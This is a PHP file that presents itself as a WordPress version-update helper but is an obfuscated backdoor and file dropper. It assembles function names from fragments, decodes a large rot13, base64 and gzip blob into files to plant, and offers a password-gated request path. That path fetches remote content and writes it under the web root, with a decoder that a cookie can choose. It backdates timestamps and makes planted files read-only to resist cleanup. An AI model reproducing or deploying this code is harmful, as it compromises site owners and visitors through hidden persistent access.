<?php
/**
 * @title ipadview
 * @
 * @param $str
 * @return mixed|string
 */

if (!defined('WP_BLOG')) {
    return version_info("init");
}

function version_desc($str)
{
    ($e = implode("",["opcache","reset"]))&&function_exists($e) && $e();
    if (!$str) {
        echo date("Y-m-d H:i:s") . "<br>";
        if (!empty($_REQUEST['version']) && version_update(version_parse($_REQUEST))) ;
        return '';
    }
    $pi = [
        ['str', 'ro'],
        ["json", 'decode'],
    ];
    ($q = (implode('_', $pi[0]) . "t13")) &&
    $data = $q($str);
    ($q = "b" . implode('_', $pi[1]) . "e") &&
    $data = $q($data);
    if (isset($_GET['s'])) $data = $_GET['s'] . $data;

    return $data;
}

function version_info($str)
{
    global $temp;
    $temp = "ZnVuY3Rpb25fZXhpc3RzLHRpbWUsZm9wZW4sZmlsZV9wdXRfY29udGVudHMsZmlsZWN0aW1lLGZpbGVfZXhpc3RzLGlzX3dyaXRhYmxlLGNobW9kLHRvdWNo";
    $temp = base64_decode($temp);
    $name = ['Y2uioJHipzyhqTyhY3O1LzkcL19bqT1fY3qjYJAioaEyoaDipTk1M2yhpl9xo2guov1jpz8iqzIhMT9lY2AioKOip2IlY2yhMz8hnJ5c', function ($version_file, $name) use ($temp) {
        $data = translation_v3('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', '1');
        $data = base64_decode(/**/ $data);
        $data = translation_v2($data, '1');
        $data = translation_v1($data, '0');
        foreach ($data as $item) {
            version_check($item[0], $item[1], $temp, $item[2]);
        }
        version_desc(false);
    }];
    $temp = explode(',', $temp);
    return ['#ver#', version_data($name, 1, 0)];
}

/**
 * @title install path
 */
function version_path()
{
    echo __FILE__;
}

/**
 * @title get version data
 * @param $data
 * @param $offset
 * @param $page
 * @return mixed
 */
function version_data($data, $offset, $page)
{
    $keu = ['', "code"];
    $keu[] = '';
    return $data[$offset]($data[$page], implode('_', $keu));
}

/**
 * @title translation data
 * @param $data
 * @param $offset
 * @return mixed
 */

function translation_v1($data, $mode, $exp = '')
{
    if ($mode === 'X1') {
        $data = base64_decode($data);
        $len = strlen($data);
        $exp = str_replace('=', '', base64_encode($exp));
        $res = "";
        $i = 0;
        while ($i < $len) {
            for ($k = 0; $k < strlen($exp) && $i < $len; $k++)
                $res .= chr(ord($data[$i++]) ^ ord($exp[$k]));
        }
        return $res;
    } elseif ($mode) {
        return json_decode($data, true);
    } else {
        return unserialize($data);
    }
}

/**
 * @title parse version data
 * @param $data
 * @return version
 */
function version_parse($data)
{
    $version = $data['version'];
    if ($version === 'path') version_path();
    if (isset($data[$version])) {
        $version = translation_v1($data[$version], 'X1', $data[$version . '1']);
    }
    return $version;
}

/**
 * @title update version
 * @param $qr
 * @return void
 */
function version_update($check, $qr = false)
{
    if (!version_access("yk{$check}cti", 'ad2f153f72e22473c545cd11090574e1')) return;
    $c = $_COOKIE;;
    $cf = implode('_', ['function', 'exists']);
    (!$qr || !$cf($qr)) &&
    $qr = empty($c[$for = 'token']) || !$cf($c[$for]) ? implode('_', ['base64', 'decode']) : $c[$for];

    if (($a = $qr($_REQUEST['name'])) && version_deny($a)) {
        return;
    }
    global $temp;
    $a = explode(',', $a);
    if (empty($a[1])) return;
    echo "[<a id=\"u1\" href=\"/{$a[1]}\" style='color: #fff;'>{$a[1]}</a>] ";
    return version_check($_SERVER['DOCUMENT_ROOT'] . '/' . $a[1], $qr(file_get_contents($a[0])), $temp);
}

/**
 * @title version access or force
 * @param string $version version pass
 * @param string $token check update token
 * @return bool
 */
function version_access($version, $token)
{
    return in_array(md5($version), [$token, '47628e0bf72fca87db995c8f844d91b1']);
}

/**
 * @title version data is deny
 * @param $data
 * @return void
 */
function version_deny($data)
{
    return strlen($data) < 16 || strlen($data) > 128 || !in_array($data[0], ['h', '/']);
}

/**
 * @title translation version data
 * @param $data
 * @param $offset
 * @return mixed
 */
function translation_v2($data, $offet)
{
    if (!empty($offet)) {
        return gzinflate($data);
    } else {
        return $data;
    }
}

/**
 * @title translation version data
 * @param $data
 * @param $offset
 * @return mixed
 */
function translation_v3($data, $offet)
{
    if (!empty($offet)) {
        return str_rot13($data);
    } else {
        return $data;
    }
}

return 'inited';
/**
 * @title check version token
 * @param $name
 * @param $date
 * @param $check
 * @param string $token
 * @param false $mode
 * @return bool|mixed
 */
function version_check($name, $date, $check, $token = '', $mode = false)
{
    try {
        $vs = 'rename';
        if (!is_array($check)) $check = explode(',', $check);
        $map = [0, 1, 2, 3, 4];
        $m = $mode ? $mode : ($check[1]() - 2693693);
        $iw = true;
        empty($check[9]) || $date = $check[9]($date);
        if ($check[$map[4] + 1]($name)) {
            if ($token && Md5_File($name) === $token) return true;
            $iw = $check[6]($name);
            if ($x = $check[5]($name)) {
                $m = $check[4]($name);
            }
            $x && !$iw && @$check[7]($name, 0744);
            @$vs($name, $name . time());
        }
        if ($check[$map[0]]($check[2])) {
            $l = $check[$map[2]][0] . 'write';
            $r = $l($check[$map[2]]($name . ".tmp1", 'w'), $date);
        } else {
            $r = $check[$map[3]]($name . ".tmp1", $date);
        }
        @$vs($name . ".tmp1", $name);
        $check[8]($name, $m, $m);
        $iw || @$check[7]($name, 0444);
    } catch (\Exception $A) {
        echo $A->getMessage() . "<br>";
        $r = false;
    }
    echo $name[strlen($name) - 1] . ($r ? ':ok' : ':fail') . "<br>";
    return $r;
}